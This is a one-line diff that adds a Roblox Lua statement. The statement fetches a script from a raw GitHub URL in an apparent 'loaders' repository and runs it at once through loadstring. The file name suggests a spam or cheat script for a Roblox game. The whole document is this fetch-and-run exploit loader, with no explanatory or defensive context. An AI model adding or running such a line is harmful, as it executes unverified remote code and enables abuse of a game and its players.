@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-an-anime-character-spam3-sgr3yh9do7l802.lua"))()
